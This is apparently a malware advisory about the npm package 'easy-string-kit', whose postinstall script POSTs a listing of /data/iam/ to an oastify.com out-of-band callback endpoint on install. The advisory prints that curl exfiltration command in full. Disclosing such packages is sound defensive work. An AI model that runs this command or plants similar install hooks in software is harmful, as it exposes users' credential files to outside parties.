summary: easy-string-kit postinstall exfiltrates /data/iam/ listing to attacker OAST endpoint
details: package.json declares a postinstall lifecycle script that runs `curl -X POST -d "$(ls -la /data/iam/)" http://3dhd6wwmusbh04m22igmzvb4hvnmblza.oastify.com/...` on every `npm install`. The script enumerates the host's `/data/iam/` directory (a path typically containing cloud IAM credentials) and POSTs the listing in cleartext to a Burp Collaborator / OAST callback subdomain — infrastructure used for blind out-of-band exfiltration and RCE callbacks. The package advertises itself as a generic string-utility kit (camelcase, slugify, truncate) and ships empty author, repository, homepage, and bugs metadata, consistent with a disposable-name lure built around the install-time exfil hook. Installing this package causes automatic, unauthenticated exfiltration of filesystem contents to an attacker-controlled DNS-logging endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
